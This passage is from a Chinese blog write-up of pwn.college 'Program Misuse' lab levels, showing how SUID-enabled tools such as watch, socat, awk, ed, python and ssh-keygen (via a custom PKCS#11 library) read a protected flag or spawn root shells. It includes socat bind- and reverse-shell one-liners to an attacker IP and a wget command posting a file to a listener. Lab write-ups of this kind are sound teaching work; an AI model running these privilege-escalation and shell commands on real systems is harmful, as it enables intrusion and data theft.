<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">x:a.o b.o</span><br>	gcc -o x a.o b.o<br>	./x<br>	-/bin/sh -p<br><span class="hljs-section">b.o:b.c</span><br>	gcc -c b.c<br><span class="hljs-section">a.o:a.c</span><br>	gcc -c a.c<br></code></pre></td></tr></table></figure>

<p>最终效果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">op1n@ubuntu:~/Desktop/test$ ls<br>a.c  b.c  makefile<br>op1n@ubuntu:~/Desktop/test$ make<br>gcc -c a.c<br>gcc -c b.c<br>gcc -o x a.o b.o<br>./x<br>Hello World!<br>/bin/sh -p<br><span class="hljs-meta prompt_">$ </span><br></code></pre></td></tr></table></figure>



<p>27.nice</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nice /bin/sh -p<br></code></pre></td></tr></table></figure>

<p>该命令与进程调度相关，能够以指定niceness值开始进程，该值越低，进程的优先级越高，能占用更多的资源，当然进程优先级还有其它影响因素，可通过<code>ps -l</code>查看进程niceness值。</p>
<p>无参数运行时默认niceness&#x3D;10。</p>
<p>该命令只能新建进程，改变正在运行的进程的niceness值需要<code>renice</code>命令。</p>
<p>28.timeout</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">timeout 1h /bin/sh -p<br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">Usage: timeout [OPTION] DURATION COMMAND [ARG]<br>Start COMMAND, and kill it if still running after DURATION.<br>&#x27;s&#x27; for seconds (the default), &#x27;m&#x27; for minutes, &#x27;h&#x27; for hours or &#x27;d&#x27; for days.<br></code></pre></td></tr></table></figure>



<p>29.stdbuf</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">Usage: stdbuf OPTION... COMMAND<br>Run COMMAND, with modified buffering operations for its standard streams.<br>  -i, --input=MODE   adjust standard input stream buffering<br>  -o, --output=MODE  adjust standard output stream buffering<br>  -e, --error=MODE   adjust standard error stream buffering<br></code></pre></td></tr></table></figure>

<p>OPTION后跟模式，’L’表示行缓冲，’0’表示无缓冲，其它表示全缓冲，以数字+单位的形式表示缓冲区大小。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">stdbuf -o0 /bin/sh -p <br></code></pre></td></tr></table></figure>



<p>30.setarch</p>
<p>可以改变程序的运行架构环境，并自定义环境flag。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">setarch $(uname -m) /bin/sh -p<br></code></pre></td></tr></table></figure>



<p>31.watch </p>
<p>可以周期性执行命令，并将命令的运行结果输出到终端。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">watch -x cat /flag<br></code></pre></td></tr></table></figure>

<p>或者通过如下命令维持一个可交互的shell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">watch -x sh -p -c &#x27;reset; exec sh -p 1&gt;&amp;0 2&gt;&amp;0&#x27;<br></code></pre></td></tr></table></figure>

<p>个人理解：</p>
<p>为什么<code>watch -x sh -p</code>运行后不能和shell交互呢？</p>
<p>首先正常通过打开终端启动的shell进程，其0，1，2设备描述符都会指向当前的tty终端，在其它进程中启动的shell进程，其文件描述符继承自父进程。</p>
<p>而该命令先创建watch进程，watch进程创建子进程sh -p时并没有正常初始化子进程，做了某些改动使其无法从终端获取输入，并且标准输出和错误输出也不是指向终端设备，watch还能够劫获子进程执行后的输出。两个进程的文件描述符指向如下图。</p>
<p><img src="/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/QQ%E6%88%AA%E5%9B%BE20240126012226.png" srcset="/img/loading.gif" lazyload alt="4"></p>
<p>我们可以通过exec 执行sh -p，使被watch监控的子进程被替换成新的shell进程(exec用于替换当前进程)，这样就能解除shell进程和终端的隔离，从终端获取输入。但是文件描述符1和2继承自原本的shell进程，依然是损坏的，因为0一直指向终端，所以可以通过1&gt;&amp;0 2&gt;&amp;0使其重新指向终端设备。</p>
<p><img src="/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/QQ%E6%88%AA%E5%9B%BE20240126010806.png" srcset="/img/loading.gif" lazyload alt="5"></p>
<p>这里的reset经测试在本地虚拟机中可不加，但在web的虚拟机中需要添加，否则无法输入，原因未知。</p>
<p>32.socat</p>
<p>类似于nc，但比nc更强大的一个网络连接工具，能够建立两个数据源之间的关系，其中每个数据源可以是一个文件、一个 Unix 套接字、UDP、TCP或标准输入输出等。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">Usage: socat [<span class="hljs-keyword">options</span>] <span class="hljs-symbol">&lt;bi-address&gt;</span> <span class="hljs-symbol">&lt;bi-address&gt;</span><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.itcodingman.com/socat_command/">参考</a></p>
<ul>
<li><p>无options时默认建立双向连接</p>
</li>
<li><p><code>-u</code>，建立第一个数据源向第二个数据源的单向传输</p>
</li>
<li><p><code>-U</code>，建立第二个数据源向第一个数据源的单向传输</p>
</li>
</ul>
<p>由于靶机无法访问互联网，无法反弹shell，这里直接输出flag,STDOUT改成STDIN、STDERR、0、1、2都可以</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">socat -u FILE:/flag STDOUT<br></code></pre></td></tr></table></figure>

<p>其它例子：</p>
<ul>
<li>创建文件，从STDIO输入内容</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">socat -u STDIN FILE:/flag.txt,create</span> <br>123<br></code></pre></td></tr></table></figure>

<ul>
<li>输出文件内容到stdout</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">socat -u FILE:/flag.txt stdout</span><br>123<br></code></pre></td></tr></table></figure>

<ul>
<li>正向shell</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">1.被入侵目标上使用socat监听<br>socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp-listen:9999,bind=0.0.0.0,reuseaddr,fork<br>2.攻击机连接目标获取shell<br>socat file:`tty`,raw,echo=0 tcp:192.168.0.1:9999<br></code></pre></td></tr></table></figure>

<ul>
<li>反弹shell</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">1.攻击机上使用socat监听<br>socat file:`tty`,raw,echo=0 tcp-listen:9999,bind=0.0.0.0,reuseaddr,fork<br>2.被入侵目标反弹shell至攻击机<br>socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.0.10:9999<br></code></pre></td></tr></table></figure>



<p><strong>Requires some light programming to read the flag.!</strong></p>
<p>33.whiptail </p>
<p> 可以创建交互式GUI对话框，常用于shell脚本中。</p>
<ul>
<li>–textbox <file> <height> <width>，创建一个文本对话框，显示指定文件中的文本</width></height></file></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">whiptail --textbox /flag 80 60<br></code></pre></td></tr></table></figure>



<ol start="34">
<li>awk</li>
</ol>
<p>一个文本分析工具，使用同名的awk脚本语言来解析文本，支持正则表达式</p>
<p><a target="_blank" rel="noopener" href="https://www.wjsljc.com/document/shell/advance/awk/#%E5%AE%9A%E4%B9%89">awk语法参考</a>  <a target="_blank" rel="noopener" href="https://www.myfreax.com/linux-awk-regular-expressions/">awk中正则表达式参考</a></p>
<p>可以将awk脚本放在命令行单引号中或使用<code>-f</code>参数指定awk脚本文件</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">awk [<span class="hljs-keyword">options</span>] <span class="hljs-string">&#x27;script&#x27;</span> <span class="hljs-keyword">file</span>(s)<br>awk [<span class="hljs-keyword">options</span>] -f scriptfile <span class="hljs-keyword">file</span>(s)<br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">awk &#x27;&#123;printf &quot;%s&quot;,$1&#125;&#x27; /flag<br></code></pre></td></tr></table></figure>

<p>或使用正则表达式</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">awk &#x27;//&#123;print&#125;&#x27; /flag<br></code></pre></td></tr></table></figure>



<p>35.sed</p>
<p>stream editor，流编辑器，可使用脚本来处理、编辑文本，按行依次处理。</p>
<p><a target="_blank" rel="noopener" href="https://qianngchn.github.io/wiki/4.html">参考</a></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sed <span class="hljs-selector-attr">[-hnV]</span><span class="hljs-selector-attr">[-e&lt;script&gt;]</span><span class="hljs-selector-attr">[-f&lt;script文件&gt;]</span><span class="hljs-selector-attr">[文本文件]</span><br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sed -e &#x27;&#x27; /flag<br></code></pre></td></tr></table></figure>



<p>36.ed</p>
<p>Linux中功能最简单的文本编辑器，一次仅能编辑一行而非全屏幕方式的操作。</p>
<ul>
<li><code>p</code>,打印当前行</li>
<li><code>,p</code>,显示全文</li>
<li><code>n</code>,显示最后一行的行号和内容</li>
<li><code>输入数字</code>,选择要编辑的行</li>
<li><code>q</code>,退出</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@program-misuse~level36:~/Desktop$ ed /flag<br>57    #文件大小<br>p<br>pwn.college&#123;IogjfBJO3PX8oVnPNfyoGnaMK8-.0FO3EDLwcTM1QzW&#125;<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1722082">该文章</a>介绍了可以通过sudo ed，再输入!&#x2F;bin&#x2F;sh来获取root shell</p>
<p>按理来说sudo本质就是利用了suid，但是这里无法通过有suid权限的ed获取root shell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@program-misuse~level36:~/Desktop$ ed<br>!/bin/sh -p<br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">id</span></span><br>uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)<br></code></pre></td></tr></table></figure>



<p><strong>get the flag by doing tricks with permissions</strong></p>
<p>37.chown</p>
<p>改变文件拥有者&#x2F;所在组</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chown hacker:hacker /flag<br></code></pre></td></tr></table></figure>

<p>38.chmod</p>
<p>修改文件权限</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod +666 /flag<br>cat /flag<br></code></pre></td></tr></table></figure>

<p>39.cp</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp /flag /dev/stdout<br></code></pre></td></tr></table></figure>

<p>向文件中写入内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo string | cp /dev/stdin /flag<br></code></pre></td></tr></table></figure>

<p>40.mv</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv /usr/bin/cat /usr/bin/mv<br>/challenge/babysuid_level40<br>/usr/bin/mv /flag<br></code></pre></td></tr></table></figure>



<p><strong>read the flag because they let you program anything!</strong></p>
<p>41.perl</p>
<p>Perl被设计为一种文本处理和报告生成的脚本语言,在许多其他领域也被广泛使用，包括系统管理、网络编程、图形用户界面（GUI）开发等。Perl在Web开发领域中也曾经非常流行，特别是在CGI脚本的编写中。其特点包括强大的正则表达式支持、灵活的数据类型、自由格式的代码书写、模块化和可扩展性。</p>
<ul>
<li><code>-e</code>,在命令行中直接执行perl代码，否则需要传入pl脚本文件。</li>
<li><code>-n</code>,按行处理文本，对文本中的每一行运行一遍perl代码，相当于在代码外添加了while循环。</li>
<li><code>-p</code>,按行处理文本，依次输出每行并对改行文本运行一遍perl代码。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">perl -ne &#x27;print&#x27; /flag<br></code></pre></td></tr></table></figure>



<p>42.python</p>
<p>读文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">python -c <span class="hljs-string">&quot;print(open(&#x27;/flag&#x27;).read())&quot;</span></span><br></code></pre></td></tr></table></figure>

<p>获取root shell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import os</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; os.setuid(0)</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; os.system(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure>

<p>43.ruby</p>
<ul>
<li><code>-e</code>，直接在命令行执行命令</li>
</ul>
<p>设置了suid的ruby解释器不允许从stdin获取输入，不允许-e在命令行直接执行命令，只能执行.rb文件中的代码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ruby</span><br>Traceback (most recent call last):<br>ruby: no program input from stdin allowed while running setuid (SecurityError)<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">ruby -e <span class="hljs-string">&#x27;puts File.read(&quot;flag&quot;)&#x27;</span></span><br>Traceback (most recent call last):<br>ruby: no -e allowed while running setuid (SecurityError)<br></code></pre></td></tr></table></figure>

<p>在hacker用户目录中操作</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">touch hack.rb<br>echo &#x27;puts File.read(&quot;/flag&quot;)&#x27; &gt; hack.rb <br>ruby hack.rb <br></code></pre></td></tr></table></figure>

<p>44.bash</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">bash -p</span><br>bash-5.0# cat /flag<br></code></pre></td></tr></table></figure>

<p><strong>Just straight up wasn’t designed to let you read files!</strong></p>
<p>45.date</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">date</span> -f /flag<br><span class="hljs-built_in">date</span>: invalid <span class="hljs-built_in">date</span> ??pwn.college&#123;4Bs6hvi92Cut9k0txWnQx5cFCDJ.01N4EDLwcTM1QzW&#125;??<br></code></pre></td></tr></table></figure>

<p>46.dmesg</p>
<p>dmesg命令]来自英文词组“display message”的缩写，其功能是用于显示开机过程信息。Linux内核会将开机过程信息存储在环形缓冲区（ring buffer）中，随后再写入到&#x2F;var&#x2F;log&#x2F;dmesg文件里，如果开机时来不及查看这些信息，则可以利用dmesg命令进行调取。</p>
<ul>
<li>-F, –file <file>           use the file instead of the kernel log buffer</file></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">dmesg -F /flag</span><br></code></pre></td></tr></table></figure>

<p>47.wc</p>
<p>Print newline, word, and byte counts for each FILE, and a total line if more than one FILE is specified.</p>
<p>添加以下选项可以在报错中输出文件内容</p>
<ul>
<li>–files0-from&#x3D;F,read input from the files specified by NUL-terminated names in file F;If F is - then read names from standard input</li>
</ul>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">ead input <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">files</span> specified ... <span class="hljs-keyword">in</span> <span class="hljs-built_in">file</span> F<br>不要wc在命令行上提供文件名，而是从文件 F 中读取它们。<br><br>NUL-terminated names<br>文件 F 中的文件名必须用 NUL 字符（字节值 <span class="hljs-number">0</span>）分隔，而不是换行符、制表符或空格。这是为了正确处理包含空格的文件名。<br><br>If F is - <span class="hljs-keyword">then</span> <span class="hljs-built_in">read</span> names <span class="hljs-built_in">from</span> standard input<br>文件名可以从可以从管道馈送的标准输入中读取，而不是指定真实的文件 F。在这种情况下，文件名仍应以 NUL 结尾。一个典型的例子是find ... -printf0 | wc ... <span class="hljs-comment">--files0-from=-</span><br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wc --files0-from=/flag  <br></code></pre></td></tr></table></figure>

<p>48.gcc</p>
<ul>
<li><code>-x</code>，声明参数中的文件为某语言的源码文件。由于flag文件不是.c结尾，不添加此参数则文件会被识别为要链接的目标文件</li>
<li><code>-E</code>,只进行预处理，预处理的结果直接输出的终端</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -x c -E /flag<br></code></pre></td></tr></table></figure>



<p>49.as</p>
<p>as 是二进制工具集 GNU Binutils 的一员，是 GNU 推出的一款汇编语言编译器集，用于将汇编代码编译为二进制代码，它支持多种不同类型的处理器。</p>
<ul>
<li><code>@FILE</code>,read options from FILE</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">as @/flag</span><br>Assembler messages:<br>Error: can&#x27;t open pwn.college&#123;flag&#125; for reading: No such file or directory<br></code></pre></td></tr></table></figure>



<p>50.wget</p>
<p>可以解析url并进行文件的下载和传输</p>
<ul>
<li><code>-i</code>,将文件视为url列表(每行一个url)，但是报错输出的内容似乎经过了一定的修改，无法通过该方式获取flag</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget -i /flag<br></code></pre></td></tr></table></figure>

<p>在本地端口接收wget传输的文件，文件内容会直接显示在终端</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvnp 8080   <br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget --post-file=/flag http://127.0.0.1:8080<br></code></pre></td></tr></table></figure>

<p>对比报错输出的flag和真正的flag，发现wget报错输出时会把大写字母都改成了小写，这个过程不可逆</p>
<p>pwn.college{g8o-vyld4yuefxroy7wapbf2gml.0lm5edlwctm1qzw}</p>
<p>pwn.college{g8O-vyLd4yUEFxrOY7waPBf2GMl.0lM5EDLwcTM1QzW}</p>
<p><strong>Shows how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part)!</strong></p>
<p>51.ssh-keygen - 用于生成、管理、转换ssh密钥，支持RSA和DSA两种认证密钥</p>
<ul>
<li><code>-D</code>,Download the public keys provided by the PKCS#11 shared library pkcs11.  When used in combination with -s, this option indicates that a CA key resides in a PKCS#11 token (see the CERTIFICATES section for details).用于下载 PKCS#11 共享库提供的公钥，从而和与共享库配套的设备进行通信。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lianshuiwuyi/p/17763654.html">PKCS#11</a> 是一个密码设备（主要是硬件安全模块<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9D%97">HSM</a>和智能卡）与应用程序之间的接口规范，定义了一组API，用于进行加密、解密、数字签名、密钥管理和其他密码学操作。PKCS#11接口规范定义了密码设备与应用程序之间的通信协议，以确保安全性和互操作性。例如：硬件安全模块作为一种提供加密等安全功能的计算机硬件设备，除了硬件本身，还要有配套的内核驱动、系统调用接口和用户态库，计算机才能与之通信，PKCS#11就定义了该过程的标准和规范。</p>
<p>也就是说，我们可以通过-D选项加载自定义的共享库，只要这个共享库符合PKCS#11规范。在<a target="_blank" rel="noopener" href="https://docs.oasis-open.org/pkcs11/pkcs11-base/v2.40/os/pkcs11-base-v2.40-os.html#_Toc416959740">PKCS#11定义的函数</a>中，最先执行的是C_GetFunctionList函数，其作用是获取指向 Cryptoki 库的函数指针列表的指针，然后再执行C_Initialize函数初始化 Cryptoki 库。所以我们只要将自己的代码放在C_GetFunctionList函数中，ssh-keygen命令在加载共享库时就会执行其中的代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">C_GetFunctionList</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">int</span> fd=<span class="hljs-number">0</span>;<br>        <span class="hljs-type">char</span> buf[<span class="hljs-number">60</span>];<br>        fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,O_RDWR);<br>        read(fd,buf,<span class="hljs-number">60</span>);<br>        write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">60</span>);<br>&#125;<br><br><span class="hljs-comment">//gcc -shared a.c</span><br><span class="hljs-comment">//ssh-keygen -D ./a.out</span><br></code></pre></td></tr></table></figure>



<h2 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h2><p>0.–help 简单介绍   man 详细手册</p>
<p>1.man手册中关键词查找 -&gt; 直接&#x2F;keyword   </p>
<p>2.strace命令 -&gt; 系统调用调试</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">strace [command] 2&gt;&amp;1 | grep keyword         #筛选关键字<br></code></pre></td></tr></table></figure>

<p>3.查找带有suid&#x2F;sgid权限的文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -perm -u=s -type f 2&gt;/dev/null //查找suid文件<br><br>find / -perm -g=s -type f 2&gt;/dev/null //查找sgid文件<br></code></pre></td></tr></table></figure>

<p><code>-type</code>,按文件类型查找,可以是 <code>f</code>（普通文件）、<code>d</code>（目录）、<code>l</code>（符号链接）等</p>
<p><code>-perm&lt;权限数值&gt;</code>,查找符合指定的权限数值的文件或目录，这里指定的权限为拥有即可，不必一一对应，例如:-perm 777，-perm -g&#x3D;rx(查找有r和x组权限的文件，包括rwx)</p>
<p><code>2&gt;/dev/null</code>,将标准错误输出重定向到&#x2F;dev&#x2F;null，即删除标准错误输出，不添加此项会产生很多无权限访问文件夹的提示</p>
<p>4.<code>man 2</code>+系统调用名称可以查看系统调用手册  </p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="../../../../categories/PwnCollege%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="category-chain-item">PwnCollege刷题记录</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="../../../../tags/Pwn/">#Pwn</a>
      
        <a href="../../../../tags/PwnCollege/">#PwnCollege</a>
      
        <a href="../../../../tags/Linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">#Linux权限提升</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>PwnCollege - Fundamentals - ProgramMisuse</div>
      <div>https://lkliki.github.io/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>0P1N</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年2月5日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="../../25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/" title="TL-WR886N路由器uart调试及VxWorks固件提取和分析">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">TL-WR886N路由器uart调试及VxWorks固件提取和分析</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="../../../../2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" title="BooFuzz入门-Vivotek摄像头栈溢出漏洞">
                        <span class="hidden-mobile">BooFuzz入门-Vivotek摄像头栈溢出漏洞</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
